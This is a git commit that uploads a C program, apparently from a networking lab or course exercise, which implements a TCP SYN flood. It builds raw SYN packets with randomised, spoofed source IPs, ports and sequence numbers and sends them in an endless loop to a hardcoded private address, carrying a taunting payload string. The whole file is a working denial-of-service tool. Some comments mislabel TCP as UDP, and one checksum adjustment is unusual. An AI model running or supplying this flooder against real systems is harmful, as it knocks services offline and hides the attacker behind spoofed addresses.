4605f662345d01c2d3c35335e169adc43afb2f52
ejlly <96349904+ejlly@users.noreply.github.com>
2022-05-06 15:32:28 +0200

    Add files via upload

---
+++ sigma_tcpsynflood/rawip_example.c
@@ -0,0 +1,161 @@
+/*
+ * inspired from rawip_example.c by jiaziyi
+ */
+
+
+#include <stdio.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <time.h>
+
+#include <errno.h>
+
+#include "header.h"
+
+#define DEST_IP "192.168.56.101" //set your destination ip here
+#define DEST_PORT 2000 //set the destination port here
+#define TEST_STRING "you're being flooded, and it is a pleasure" //a teststring as packet payload, min 8 bits
+
+char packet[65536];
+int const size_iph = sizeof(struct iphdr), size_tcph = sizeof(struct tcphdr), size_pseudo =  sizeof(struct pseudo_udp_header);
+
+int generate_packet(){
+	char dest_ip[] = DEST_IP;
+
+	char data_string[] = TEST_STRING;
+	memset(packet, 0, 65536);
+
+	//IP header pointer
+	struct iphdr *iph = (struct iphdr *)packet;
+
+	//UDP header pointer
+	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
+	struct pseudo_udp_header ptcph;
+
+	//data section pointer
+	char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
+
+	//fill the data section
+	strncpy(data, data_string, strlen(data_string));
+	
+	int const size_data = strlen(data);
+	int const tot_size = sizeof(struct iphdr) + size_tcph + size_data;
+
+
+	//fill the IP header here
+	iph->version = 4;
+	iph->ihl = 5;
+	iph->tos = 0;
+	iph->tot_len = size_iph + size_tcph + size_data;
+	iph->id = 0; //random value
+	iph->ttl = 128;
+	iph->protocol = 6;
+	iph->saddr = (rand()%0xffffffff); //no htonl
+	iph->daddr = inet_addr(dest_ip); //no htonl
+	iph->check = htons(checksum((short unsigned int *) iph, size_iph + size_tcph + size_data));
+
+
+	//fill the UDP header
+	
+	tcph->source = htons(rand());
+	tcph->dest = htons(DEST_PORT);
+	tcph->seq = htonl(rand()%4294967296);
+	tcph->ack_seq = htonl(0);
+	tcph->doff = 5;
+	tcph->syn = 1;
+	tcph->window = htons(64240);
+
+	ptcph.source_address = iph->saddr;
+	ptcph.dest_address = iph->daddr;
+	ptcph.protocol = iph->protocol;
+	ptcph.udp_length = htons(size_tcph + size_data);
+	
+	//printf("total msg size : %d\n", tot_size);
+
+	
+
+	//checksum calculation
+	char *check_calc = malloc(size_tcph + size_pseudo + size_data);
+	
+	memcpy(check_calc, &ptcph, size_pseudo);
+	memcpy(check_calc + size_pseudo, tcph, size_tcph);
+	memcpy(check_calc + size_pseudo + size_tcph, data, size_data);
+
+	tcph->check = checksum((short unsigned *) check_calc, size_tcph + size_pseudo + size_data);
+
+	free(check_calc);
+
+	return tot_size;
+}
+
+void modify_packet(){
+	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
+	struct iphdr *iph = (struct iphdr *)packet;
+	char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
+
+	iph->saddr = rand();
+	tcph->seq = htonl(rand()%4294967296);
+	tcph->source = rand();
+	tcph->check = 0;
+
+	int const size_data = strlen(data);
+	int const tot_size = sizeof(struct iphdr) + size_tcph + size_data;
+
+	//checksum calculation
+	char *check_calc = malloc(size_tcph + size_pseudo + size_data);
+	
+
+	struct pseudo_udp_header ptcph;
+	
+	ptcph.source_address = iph->saddr;
+	ptcph.dest_address = iph->daddr;
+	ptcph.protocol = iph->protocol;
+	ptcph.udp_length = htons(tcph->doff + size_data);
+	ptcph.placeholder = 0;
+
+	memcpy(check_calc, &ptcph, size_pseudo);
+	memcpy(check_calc + size_pseudo, tcph, size_tcph);
+	memcpy(check_calc + size_pseudo + size_tcph, data, size_data);
+
+	tcph->check = htons(ntohs(checksum((short unsigned *) check_calc, size_tcph + size_pseudo + size_data)) - 15);
+
+	free(check_calc);
+}
+
+int main(int argc, char *argv[]){
+
+	srand(time(NULL));
+	
+	int tot_size = generate_packet();
+
+	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+    int hincl = 1;                  /* 1 = on, 0 = off */
+    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
+
+	if(fd < 0){
+		perror("Error creating raw socket ");
+		exit(1);
+	}
+	
+
+	//send the packet
+	struct sockaddr_in dest;
+	dest.sin_family = AF_INET;
+	dest.sin_port = htons(DEST_PORT);
+	dest.sin_addr.s_addr = inet_addr(DEST_IP);
+
+	while(1){
+		if(sendto(fd, packet, tot_size, 0, (struct sockaddr *) &dest, sizeof(dest)) < 0)
+			printf("Error : %s\n", strerror(errno));
+		modify_packet();
+	}
+
+	close(fd);
+
+	return 0;
+}
